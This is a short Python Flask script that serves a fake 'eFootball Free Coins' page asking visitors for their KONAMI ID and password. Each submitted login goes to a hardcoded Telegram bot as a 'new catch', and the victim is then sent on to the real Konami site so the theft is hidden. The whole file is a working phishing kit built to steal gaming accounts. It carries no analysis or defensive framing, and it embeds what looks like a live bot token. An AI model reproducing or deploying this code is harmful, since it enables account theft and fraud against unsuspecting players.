import os
from flask import Flask, render_template_string, request, redirect
import requests

app = Flask(__name__)

# بياناتك يا سيد جاهزة ومثبتة
TELEGRAM_BOT_TOKEN = "8861759753:AAEQPikaUCB-yti_nWZVCx9LFCfs6g4lWOU"
CHAT_ID = "5204157508"

def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Error sending telegram message: {e}")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eFootball Free Coins</title>
    <style>
        body { background-color: #121212; color: #ffffff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e1e1e; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); width: 100%; max-width: 380px; text-align: center; }
        h2 { color: #00d2ff; margin-bottom: 5px; }
        p { color: #b0b0b0; font-size: 14px; margin-bottom: 25px; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #2c2c2c; border: 1px solid #3c3c3c; border-radius: 6px; color: #fff; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #00d2ff; border: none; border-radius: 6px; color: #000; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>eFootball Free Coins</h2>
        <p>Login with your KONAMI ID to claim 10,000 Coins!</p>
        <form method="POST">
            <input type="text" name="username" placeholder="Konami ID / Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Claim Coins</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        msg = f"🚨 *صيد جديد يا سيد!*\n\n👤 *ID/Email:* `{username}`\n🔑 *Password:* `{password}`"
        send_to_telegram(msg)
        return redirect("https://www.konami.com/efootball/")
    return render_template_string(HTML_TEMPLATE)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
